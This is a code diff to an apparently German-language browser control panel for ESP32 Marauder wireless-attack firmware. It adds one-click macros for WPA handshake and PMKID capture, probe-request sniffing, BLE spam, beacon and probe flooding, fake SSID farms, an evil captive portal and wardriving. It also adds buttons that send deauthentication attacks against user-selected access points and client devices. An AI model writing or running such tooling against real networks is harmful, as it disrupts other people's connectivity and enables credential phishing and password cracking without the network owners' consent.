+  fullrecon:"# Voll-Recon: AP + STA + SSIDs + BLE\nscanap\nwait 8000\nstopscan\nlist -a\nscansta\nwait 8000\nstopscan\nlist -c\nlist -s\nblescan -t all\nwait 8000\nstopscan",
+  pmkid_hunt:"# WPA-Handshake/PMKID auf allen Kanaelen mitschneiden\n"+hopSniff("sniffpmkid",2500),
+  probe_recon:"# Probe-Requests sammeln (Geraetesuchen)\n"+hopSniff("sniffprobe",1500),
+  // --- BLE ---
+  blescan:"# BLE-Geraete scannen\nblescan -t all\nwait 8000\nstopscan",
+  ble_recon:"# BLE voll: Scan + Sniff + Skimmer\nblescan -t all\nwait 6000\nstopscan\nsniffbt\nwait 4000\nstopscan\nsniffskim\nwait 4000\nstopscan",
+  blespam_all:"# BLE-Spam alle Typen (kurz)\nblespam -t all\nwait 8000\nstopscan",
+  // --- Attack (Beacon/Probe, kein select noetig) ---
+  beacon_random:"# Beacon-Spam Zufallsnamen\nattack -t beacon -r\nwait 10000\nstopscan",
+  rickroll:"# Rickroll-SSID-Spam\nattack -t rickroll\nwait 10000\nstopscan",
+  ssid_farm:"# 20 Fake-SSIDs bauen und spammen\nclearlist -s\nssid -a -g 20\nlist -s\nattack -t beacon -l\nwait 12000\nstopscan",
+  probe_flood:"# Probe-Flut (braucht gewaehlte APs)\nattack -t probe\nwait 8000\nstopscan",
+  // --- Portal / Wardrive / Wartung ---
+  portal:"# Evil Portal starten (index.html von SD-Root)\nevilportal -c start",
+  wardrive:"# APs + GPS loggen (30 s)\ngps\nwait 1500\nwardrive\nwait 30000\nstopscan",
+  reset_lists:"# Alle Ziel-Listen im Board leeren\nstopscan\nclearlist -a\nclearlist -s\nclearlist -c",
+  hop_on_scan:"# Kanal-Hopping AN, dann nativer AP-Scan\nsettings -s EnableChannelHopping true\nscanap\nwait 12000\nstopscan\nlist -a"
 };
 function getMacros(){try{return JSON.parse(localStorage.getItem("mccMacros")||"[]");}catch(e){return[];}}
 function saveMacros(a){localStorage.setItem("mccMacros",JSON.stringify(a));}
@@ -1160,10 +1331,11 @@ async function macroRun(){if(!writer){append("Nicht verbunden.","line-err");retu
 let palItems=[],palSel=0;
 function openPalette(){$("modal").classList.add("open");$("palInput").value="";renderPal("");$("palInput").focus();}
 function closePalette(){$("modal").classList.remove("open");}
-function renderPal(q){q=q.toLowerCase();palItems=CMDS.filter(([c,cmd])=>(c+" "+cmd).toLowerCase().includes(q));palSel=0;
+function renderPal(q){q=q.toLowerCase();palItems=CMDS.filter(([c,cmd,desc])=>(c+" "+cmd+" "+(desc||"")).toLowerCase().includes(q));palSel=0;
   const list=$("palList");list.innerHTML="";
-  palItems.forEach(([cat,cmd],i)=>{const d=document.createElement("div");d.className="pi"+(i===0?" sel":"");
+  palItems.forEach(([cat,cmd,desc],i)=>{const d=document.createElement("div");d.className="pi"+(i===0?" sel":"");
     d.innerHTML=`<span class="c"></span><span class="cat"></span>`;d.querySelector(".c").textContent=cmd;d.querySelector(".cat").textContent=cat;
+    if(desc){const s=document.createElement("div");s.style.cssText="font-size:11px;color:var(--muted);margin-top:2px";s.textContent=desc;d.appendChild(s);}
     d.onclick=()=>{fire(cmd);closePalette();};list.appendChild(d);});}
 function palMove(d){const items=$("palList").children;if(!items.length)return;items[palSel]&&items[palSel].classList.remove("sel");
   palSel=(palSel+d+items.length)%items.length;items[palSel].classList.add("sel");items[palSel].scrollIntoView({block:"nearest"});}
@@ -1191,12 +1363,17 @@ $("wifiStop").onclick=()=>{smartAbort=true;fire("stopscan");};
 // dashboard quick actions (Label, Befehl, Erklärung)
 [["Hilfe/Befehle","help","Listet alle Marauder-Befehle."],
  ["Neustart","reboot","Startet das Board neu."],
+ ["Info","info","Firmware-/Hardware-Info."],
  ["Stop","stopscan","Beendet jeden Scan/Angriff."],
  ["Einstellungen","settings","Zeigt aktuelle Einstellungen."],
+ ["Hopping AN","settings -s EnableChannelHopping true","Kanal-Hopping einschalten (scanap hoppt dann)."],
  ["WLAN scannen","scanap","Sucht Access Points."],
  ["Clients scannen","scansta","Sucht verbundene Geräte."],
+ ["APs anzeigen","list -a","Zeigt gefundene APs (echte Indizes)."],
  ["Kanal zeigen","channel","Zeigt aktuellen Funkkanal."],
- ["BLE scannen","blescan -t all","Sucht Bluetooth-Geräte."]
+ ["BLE scannen","blescan -t all","Sucht Bluetooth-Geräte."],
+ ["GPS-Status","gps","Prüft GPS-Fix/Satelliten."],
+ ["Listen leeren","clearlist -a","Leert die AP-Liste im Board."]
 ].forEach(([lab,c,desc])=>{
   const b=document.createElement("button");b.className="btn";b.textContent=lab;b.title=desc+"  ("+c+")";b.onclick=()=>fire(c);$("dashQuick").appendChild(b);});
 
@@ -1208,8 +1385,20 @@ $("ssidNameBtn").onclick=()=>{const n=$("ssidName").value.trim();if(n)fire("ssid
 $("apClear").onclick=()=>{apList=[];renderAp();saveState();};
 $("staClear").onclick=()=>{staList=[];renderSta();saveState();};
 $("bleClear").onclick=()=>{bleList=[];renderBle();saveState();};
-$("apSelMarked").onclick=async()=>{for(const c of document.querySelectorAll('#apRows input:checked'))await fire("select -a "+c.dataset.i);};
-$("staSelMarked").onclick=async()=>{for(const c of document.querySelectorAll('#staRows input:checked'))await fire("select -c "+c.dataset.i);};
+$("apSelMarked").onclick=()=>{if(!apTargets.size){append("Erst APs anhaken.","line-err");return;}showView("atk");};
+$("staSelMarked").onclick=()=>{if(!staTargets.size){append("Erst Stationen anhaken.","line-err");return;}showView("atk");};
+// MAC-Modus-Deauth gegen angehakte Ziele (ohne Firmware-select)
+$("atkDeauthAp").onclick=async()=>{const t=[...apTargets.values()];
+  if(!t.length){append("Keine AP-Ziele gewählt (WiFi-Tab: Häkchen setzen).","line-err");return;}
+  append("Deauth (MAC-Modus) gegen "+t.length+" AP(s)...","line-sys");
+  for(const a of t){if(a.ch)await fire("channel -s "+a.ch);
+    append("→ Deauth "+a.mac+(a.name?" ("+a.name+")":"")+" auf Ch "+(a.ch||"?"),"line-sys");
+    await fire("attack -t deauth -s "+a.mac+" -d ff:ff:ff:ff:ff:ff");}};
+$("atkDeauthSta").onclick=async()=>{const t=[...staTargets.values()];
+  if(!t.length){append("Keine Stationen gewählt (Stationen-Tabelle anhaken — nicht APs).","line-err");return;}
+  append("Deauth gegen "+t.length+" Station(en)...","line-sys");
+  for(const s of t){if(s.ch)await fire("channel -s "+s.ch);await fire("attack -t deauth -d "+s.mac);}};
+renderTargets();
 
 // portal
 $("epStartFile").onclick=()=>{const f=$("epFile").value.trim();if(f)fire("evilportal -c start -w "+f);};
@@ -1241,13 +1430,22 @@ $("macroRun").onclick=macroRun;$("macroStop").onclick=()=>{macroAbort=true;};
 // flash
 $("autoRepair").onclick=autoRepair;$("flashConnect").onclick=flashConnect;$("eraseFlash").onclick=eraseFlash;
 $("doFlash").onclick=doFlash;$("flashReset").onclick=flashReset;$("fwList").onclick=fwList;$("appFlash").onclick=appFlash;$("repairUni").onclick=repairUni;$("fwSearch").addEventListener("input",fwRender);
+$("fwSelect").addEventListener("change",fwCheckPick);
 $("boardPreset").onchange=applyBoard;$("hwReset").onclick=hwReset;$("bootMode").onclick=bootMode;
 
 // console
 $("search").addEventListener("input",()=>document.querySelectorAll("#log>div").forEach(applyFilter));
 $("rxOnly").addEventListener("change",()=>document.querySelectorAll("#log>div").forEach(applyFilter));
 $("clear").onclick=()=>{logEl.innerHTML="";romHits=0;localStorage.removeItem("mccLog");};
-window.addEventListener("beforeunload",()=>{try{saveState();saveLog();}catch(e){}});
+window.addEventListener("beforeunload",e=>{try{saveState();saveLog();}catch(_){}
+  // Bei aktiver Board-Verbindung vor versehentlichem Reload/Schliessen warnen (F5 trennt sonst den Port)
+  if(port){e.preventDefault();e.returnValue="";return"";}});
+// F5 / Ctrl+R / Cmd+R abfangen solange verbunden -> kein versehentliches Trennen
+window.addEventListener("keydown",e=>{
+  const reload=e.key==="F5"||((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==="r");
+  if(reload&&port){e.preventDefault();e.stopPropagation();
+    append("Reload blockiert — Board ist verbunden. Zum echten Neuladen erst 'Trennen' klicken (oder nochmal F5 im Bestätigungsdialog).","line-err");}
+},true);
 $("save").onclick=()=>{const b=new Blob([logEl.innerText],{type:"text/plain"});const a=document.createElement("a");
   a.href=URL.createObjectURL(b);a.download="marauder-log-"+new Date().toISOString().replace(/[:.]/g,"-")+".txt";a.click();};
 
